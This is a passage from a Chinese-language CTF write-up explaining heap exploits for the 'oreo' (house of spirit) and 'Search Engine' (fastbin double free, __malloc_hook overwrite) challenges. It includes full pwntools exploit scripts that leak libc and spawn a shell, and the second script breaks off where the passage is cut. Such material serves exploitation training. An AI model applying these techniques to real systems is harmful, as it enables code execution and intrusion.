<div class="highlight"><pre><span></span><code>pwndbg&gt; x /20wx 0x0804A2A0
0x804a2a0:  0x00000000  0x00000040  0x0804a2c0  0x00000000
0x804a2b0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre></div>
<p>申请第 0x40 的时候溢出修改最后 4 字节的下一 chunk 地址为 0x0804A2A8 。bypass fastbin size check 。</p>
<p>然后利用写入 notice 信息，布置 fake_chunk 后一个 chunk 信息，bypass 相关保护，完成 house  of spirit 布置。</p>
<p>写入内容就是就是：从 0x0804A2A8 + 0x30 开始写入下一个 chunk header 信息即可（prev_size = 0x40 , size = 0x100 ）。</p>
<p>当 free all chunk 时 fake chunk 就会通过检查，成功放入到 bin 中：</p>
<div class="highlight"><pre><span></span><code>0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL
</code></pre></div>
<p>再次申请 chunk ，并写入函数地址，之后通过写入 notice 修改函数。</p>
<h3 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./oreo&quot;</span>
<span class="n">oreo</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./oreo&quot;</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./oreo&quot;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">descrip</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&#39;Rifle name: &#39;)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&#39;Rifle description: &#39;)</span>
    <span class="c1">#sleep(0.5)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">show_rifle</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;===================================</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">message</span><span class="p">(</span><span class="n">notice</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&quot;Enter any notice you&#39;d like to submit with your order: &quot;)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">notice</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="nb">print</span> <span class="s1">&#39;step 1. leak libc base&#39;</span>
    <span class="n">name</span> <span class="o">=</span> <span class="mi">27</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">oreo</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">show_rifle</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;===================================</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
    <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
    <span class="nb">print</span> <span class="s1">&#39;step 2. free fake chunk at 0x0804A2A8&#39;</span>

    <span class="c1"># now, oifle_cnt=1, we need set it = 0x40</span>
    <span class="n">oifle</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">while</span> <span class="n">oifle</span> <span class="o">&lt;</span> <span class="mh">0x3f</span><span class="p">:</span>
        <span class="c1"># set next link=NULL</span>
        <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
        <span class="n">oifle</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804a2a8</span><span class="p">)</span>
    <span class="c1"># set next link=0x0804A2A8, try to free a fake chunk</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="c1"># gdb.attach(p)</span>
    <span class="c1"># before free, we need to bypass some check</span>
    <span class="c1"># fake chunk&#39;s size is 0x40</span>
    <span class="c1"># 0x20 *&#39;a&#39; for padding the last fake chunk</span>
    <span class="c1"># 0x40 for fake chunk&#39;s next chunk&#39;s prev_size</span>
    <span class="c1"># 0x100 for fake chunk&#39;s next chunk&#39;s size</span>
    <span class="c1"># set fake iofle&#39; next to be NULL</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x20</span> <span class="o">*</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
    <span class="c1"># payload = payload.ljust(60, &#39;b&#39;)</span>
    <span class="c1"># payload += p32(0)</span>
    <span class="c1"># payload = payload.ljust(128, &#39;c&#39;)</span>
    <span class="n">message</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>



    <span class="c1"># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span>
    <span class="n">order</span><span class="p">()</span>

    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Okay order submitted!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="nb">print</span> <span class="s1">&#39;step 3. get shell&#39;</span>
    <span class="c1"># modify free@got to system addr</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">oreo</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;strlen&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">20</span><span class="p">)</span>

    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
    <span class="c1">#gdb.attach(p)</span>
    <span class="n">message</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;||/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</code></pre></div>
<blockquote>
<p><a href="https://bbs.pediy.com/thread-247214-1.htm">[原创]2014 hack.lu oreo</a></p>
</blockquote>
<h2 id="2015-9447-ctf-search-engine">2015 9447 CTF : Search Engine<a class="headerlink" href="#2015-9447-ctf-search-engine" title="Permanent link">&para;</a></h2>
<h3 id="_19">基本情况<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
FORTIFY:  Enabled
</code></pre></div>
</td></tr></table>
<p>程序没有 setbuf ，会自动申请 chunk 存放输入缓冲数据。</p>
<h3 id="_20">基本功能<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
<p>一个变种的堆管理器，算是有增删查功能。菜单两个入口：</p>
<ol>
<li>Search with a word</li>
<li>Index a sentence</li>
</ol>
<p>index 可以创建堆，大小自定义（小于 0xFFD），读取字符串长度必须等于给定的长度，输入字符串没有设置结束符 \x00 。</p>
<p>search 搜索句子，读取搜索字符串长度必须等给定长度，检索规则如下：</p>
<div class="highlight"><pre><span></span><code><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">chunk_list</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">**</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">**</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="n">v0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">i</span><span class="p">,</span> <span class="n">chunk_ptr</span><span class="p">,</span> <span class="n">v0</span><span class="p">)</span> <span class="p">)</span>
        <span class="p">{</span>
</code></pre></div>
<p>具体结构体结构调试一下就能看到逻辑，0x28 那个就是结构体 chunk 。</p>
<p>首先是 sentence chunk 首字节不能为 \x00 ，然后根据 size 和 memcmp 搜索相同的 chunk 。</p>
<h3 id="_21">漏洞<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
<p>最明显的就是 double free ，在 search 找到对应 sentenc chunk 之后，选择释放完成后，并没有将结构体指针置零。</p>
<p>这个功能函数还有一个漏洞，释放 sentenc chunk 之前会使用 memset 将 chunk 全部置零，避免了检查被释放的 chunk （源码检查机制：<code>if ( **(_BYTE **)(i + 16) )</code>），但是当 chunk 放入 fastbin 非首个 chunk 或者是 unsortedbin 等时，会向 fd 、bk 写入地址信息，使得 sentenc chunk 首字节非 0 ，致使 search 时最终还是会搜索被释放的 chunk 。</p>
<p>还有漏洞就是写入 sentenc 的时候，如果写入长度刚刚好等于给出的写入长度，那么 sentenc 结尾不会补上结束符 \x00 。（网上有 wp 利用这个漏洞，泄露栈上的 libc 地址）</p>
<h3 id="_22">思路<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
<p>利用 free 之后没有置零指针，完成泄露 libc 地址，fastbin Arbitrary Alloc 修改 malloc_hook 为 onegadget 。</p>
<ol>
<li>申请一个非 fastbin 大小 chunk ，将其释放，fd 指针就会写入 libc 段地址。利用 search 搜索 <code>\x00</code> ，找到在 unsorted bin 中的 chunk ，程序会将 chunk 的 fd 指针给输出。</li>
<li>申请 3 个 fastbin chunk ，利用最后两个完成 Arbitrary Alloc 篡改 malloc_hook </li>
</ol>
<p>申请 0x88 unsorted bin chunk ，泄露 libc 地址：</p>
<div class="highlight"><pre><span></span><code><span class="n">Index</span><span class="p">(</span><span class="s1">&#39; m &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">))</span>
<span class="n">search</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">search</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Found 136: &#39;</span><span class="p">)</span>
<span class="n">unsortbin_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;unsortbin_addr:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">unsortbin_addr</span><span class="p">))</span>
</code></pre></div>
<p>Arbitrary Alloc 步骤：sky 三个 chunk 先释放到 fastbin 中，然后 double free k chunk ，完成修改链表。如果缺少 s chunk 只使用两个堆，double free 时报错：<code>double free or corruption (fasttop)</code>，此时被 double free chunk 的链首。</p>
<div class="highlight"><pre><span></span><code><span class="n">search</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">search</span><span class="p">(</span><span class="s1">&#39;k&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">search</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
<span class="n">search</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>

<span class="n">fakechunk_addr</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="mh">0x23</span>
<span class="n">Index</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_addr</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">))</span>
<span class="n">Index</span><span class="p">(</span><span class="s1">&#39; s &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">))</span>
<span class="n">Index</span><span class="p">(</span><span class="s1">&#39; k &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">))</span>
<span class="n">Index</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xf1207</span><span class="o">+</span><span class="n">libc_base</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x1b</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">))</span>
</code></pre></div>
<p>篡改链表之后，通过偏移找到  size 在 fastbin 范围的 fakechunk 。</p>
<h3 id="exp_1">EXP<a class="headerlink" href="#exp_1" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="c1"># @Author  : MrSkYe</span>
<span class="c1"># @Email   : skye231@foxmail.com</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./search&quot;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./search&quot;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;3: Quit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Enter the word size:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">word</span><span class="p">)))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Enter the word:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">Index</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;3: Quit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Enter the sentence size:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">word</span><span class="p">)))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Enter the sentence:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="n">Index</span><span class="p">(</span><span class="s1">&#39; m &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">))</span>
    <span class="n">search</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Delete this sentence (y/n)?</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">search</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Found 136: &#39;</span><span class="p">)</span>
    <span class="n">unsortbin_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;unsortbin_addr:&quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">unsortbin_addr</span><span class="p">))</span>


    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">unsortbin_addr</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
    <span class="n">str_binsh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
    <span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_base:&#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;system:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;str_binsh:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">str_binsh</span><span class="p">))</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;malloc_hook:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>


    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>

    <span class="n">Index</span><span class="p">(</span><span class="s1">&#39; s &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">))</span>
    <span class="n">Index</span><span class="p">(</span><span class="s1">&#39; k &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">))</span>
    <span class="n">Index</span><span class="p">(</span><span class="s1">&#39; y &#39;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">))</span>

    <span class="n">search</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">search</span><span class="p">(</span><span class="s1">&#39;k&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">search</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>
    <span class="n">search</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Found&quot;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">)</span>

    <span class="n">fakechunk_addr</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="mh">0x23</span>
    <span class="n">Index</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">fakechunk_addr</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">))</span>
